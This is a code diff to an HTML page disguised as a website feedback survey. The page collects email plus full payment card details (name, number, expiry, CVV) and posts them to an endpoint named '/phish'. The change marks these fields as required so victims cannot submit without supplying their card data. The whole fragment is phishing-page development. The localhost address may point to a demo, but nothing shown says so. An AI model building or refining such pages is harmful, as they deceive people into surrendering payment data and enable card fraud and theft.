@@ -7,7 +7,7 @@
         information. </p>
     <form id="opinion-form" action="http://localhost:5000/phish" method="POST">
         <label for="email">Email</label>
-        <input id="email" type="text" name="email">
+        <input id="email" type="text" name="email" required>
         <br>
         <p>What can we be improved about this website?</p>
         <textarea id="opinion" rows="5" cols="100"></textarea>
@@ -18,7 +18,7 @@
                     <label for="name-on-card" maxlength="16">Name on Card</label>
                 </td>
                 <td style="border:0;">
-                    <input id="name-on-card" type="text" name="name-on-card">
+                    <input id="name-on-card" type="text" name="name-on-card" required>
                 </td>
             </tr>
             <tr style="border:0;">
@@ -26,7 +26,7 @@
                     <label for="card-number">Card Number</label>
                 </td>
                 <td style="border:0;">
-                    <input id="card-number" type="text" name="card-number">
+                    <input id="card-number" type="text" name="card-number" required>
                 </td>
             </tr>
             <tr style="border:0;">
@@ -34,7 +34,7 @@
                     <label for="expiration-month" maxlength="2"> Expiration Month </label>
                 </td>
                 <td style="border:0;">
-                    <input id="expiration-month" type="text" name="expiration-month">
+                    <input id="expiration-month" type="text" name="expiration-month" required>
                 </td>
             </tr>
             <tr style="border:0;">
@@ -42,7 +42,7 @@
                     <label for="expiration-year" maxlength="2"> Expiration Year </label>
                 </td>
                 <td style="border:0;">
-                    <input id="expiration-year" type="text" name="expiration-year">
+                    <input id="expiration-year" type="text" name="expiration-year" required>
                 </td>
             </tr>
             <tr style="border:0;">
@@ -50,7 +50,7 @@
                     <label for="cvv">CVV</label>
                 </td>
                 <td style="border:0;">
-                    <input id="cvv" type="text" name="cvv">
+                    <input id="cvv" type="text" name="cvv" required>
                 </td>
             </tr>
         </table>
